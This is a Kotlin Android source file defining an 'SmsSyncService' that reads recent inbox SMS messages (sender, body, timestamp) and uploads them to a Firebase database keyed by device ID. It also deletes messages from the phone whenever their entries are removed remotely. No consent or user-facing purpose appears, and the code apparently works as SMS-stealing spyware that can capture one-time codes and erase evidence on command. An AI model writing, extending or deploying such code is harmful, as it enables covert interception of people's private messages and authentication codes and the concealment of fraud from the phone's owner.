package com.vplan.rxtprob

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import android.provider.Settings
import android.util.Log
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase

class SmsSyncService(private val context: Context) {

    private val TAG = "SmsSyncService"
    private val deviceId: String = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
    private val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

    fun uploadInitialSms(limit: Int = 20) {
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val id = it.getString(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val sender = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val smsData = mapOf(
                        "id" to id,
                        "sender" to sender,
                        "body" to body,
                        "timestamp" to date
                    )
                    smsRef.child(id).setValue(smsData)
                    count++
                }
            }
            Log.d(TAG, "Uploaded initial SMS")
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }

    fun listenForFirebaseDeletion() {
        smsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildRemoved(snapshot: DataSnapshot) {
                val smsId = snapshot.key
                if (smsId != null) deleteSmsFromPhone(smsId)
            }
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase listener cancelled: ${error.message}")
            }
        })
    }

    private fun deleteSmsFromPhone(smsId: String) {
        try {
            val defaultPkg = android.provider.Telephony.Sms.getDefaultSmsPackage(context)
            Log.d(TAG, "Default SMS package = $defaultPkg, myPkg=${context.packageName}")
            if (defaultPkg != context.packageName) {
                Log.e(TAG, "Not default SMS app — cannot delete SMS")
                return
            }

            val uriSms = Uri.parse("content://sms")
            val cursor = context.contentResolver.query(uriSms, null, "_id=?", arrayOf(smsId), null)
            if (cursor == null || cursor.count == 0) {
                cursor?.close()
                Log.w(TAG, "SMS not found or already deleted: $smsId")
                return
            }
            cursor.close()

            val deleted = context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
            if (deleted > 0) Log.d(TAG, "Deleted SMS: $smsId") else Log.e(TAG, "Could not delete SMS: $smsId")
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException deleting SMS: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting SMS: ${e.message}")
        }
    }
}
